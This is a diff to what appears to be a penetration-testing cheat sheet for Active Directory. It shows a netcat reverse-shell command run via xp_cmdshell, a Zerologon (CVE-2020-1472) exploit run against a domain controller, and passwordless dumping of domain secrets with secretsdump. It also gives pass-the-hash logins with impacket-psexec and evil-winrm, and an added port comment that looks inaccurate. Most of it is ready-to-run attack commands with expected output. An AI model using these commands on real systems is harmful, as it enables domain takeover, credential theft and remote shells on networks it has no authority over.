@@ -734,7 +734,7 @@ xp_cmdshell  "c:\\Users\Public\\nc.exe -e cmd.exe <attacker ip> <attacker port>"
 https://github.com/VoidSec/CVE-2020-1472
 
 ```shell
-./cve-2020-1472-exploit.py -n <domain controller> -t <dc-ip>
+./cve-2020-1472-exploit.py -n <DC_NAME> -t <dc-ip>
 # [+] Success: Target is vulnerable!                                                                                                         
 # [-] Do you want to continue and exploit the Zerologon vulnerability? [N]/y 
 # y
@@ -742,7 +742,9 @@ https://github.com/VoidSec/CVE-2020-1472
 python secretsdump.py -no-pass -just-dc <domain>/'DC_NETBIOS_NAME$'@<dc-ip>
 # e.g., python secretsdump.py -no-pass -just-dc test.local/'USER01$'@10.10.10.168
 # remote login
-evil-winrm -i <dc-ip> -u <username> -H '<hash>' 
+impacket-psexec "<username>":@<target ip> -hashes "<NTLM hash>"
+# default 5989 port
+evil-winrm -i <target ip> -u <username> -H '<NTLM hash>'
 ```
 
 ### :open_file_folder: AD Recycle Bin
